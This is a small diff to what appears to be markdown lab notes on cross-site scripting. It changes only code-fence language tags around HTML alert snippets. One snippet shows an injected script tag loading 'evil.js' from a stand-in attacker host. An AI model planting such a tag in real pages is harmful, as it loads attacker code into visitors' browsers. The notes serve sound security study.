@@ -8,7 +8,7 @@
   
   ![Screenshot (823)](https://user-images.githubusercontent.com/63872951/183879680-f1aa6a93-8be2-4097-9440-8156d8b14488.png)
 
-  ```
+  ```js
   <div class="alert alert-danger">
     <p>Invalid Input Detected</p>
   </div>
@@ -19,7 +19,7 @@
   ![Screenshot (824)](https://user-images.githubusercontent.com/63872951/183879978-45148e11-ae2c-4b71-b1d0-e6fc0ff77f55.png)
 
   
-  ```
+  ```js
   <div class="alert alert-danger">
     <p><script src="https://attacker.thm/evil.js"></script></p>
   </div>
